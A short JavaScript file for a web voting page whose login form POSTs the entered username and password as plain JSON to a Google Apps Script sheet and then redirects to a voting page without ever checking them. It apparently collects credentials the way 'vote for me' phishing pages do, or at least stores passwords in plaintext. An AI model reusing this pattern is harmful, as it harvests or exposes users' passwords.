document.addEventListener("DOMContentLoaded", function () {
    const loginForm = document.getElementById("loginForm");

    if (loginForm) {
        loginForm.addEventListener("submit", function (event) {
            event.preventDefault();
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            
            // Send login data to Google Sheets
            fetch("https://script.google.com/macros/s/YOUR_GOOGLE_SCRIPT_URL/exec", {
                method: "POST",
                body: JSON.stringify({ username, password, type: "login" }),
                headers: { "Content-Type": "application/json" }
            }).then(() => {
                window.location.href = "voting.html"; // Redirect to voting page
            });
        });
    }

    const voteButtons = document.querySelectorAll(".voteBtn");
    voteButtons.forEach(button => {
        button.addEventListener("click", function () {
            const vote = this.getAttribute("data-name");

            // Send vote to Google Sheets
            fetch("https://script.google.com/macros/s/AKfycbzg9Rg8Ge8MAA2OkrQK_a1Z1xzIM5m1EHtIzOGYPzjyxIeJZj6lxihOdXogcKT1lNv8/exec", {
                method: "POST",
                body: JSON.stringify({ vote, type: "vote" }),
                headers: { "Content-Type": "application/json" }
            }).then(() => {
                alert("Vote submitted! Thank you!");
                window.location.href = "thankyou.html";
            });
        });
    });
});
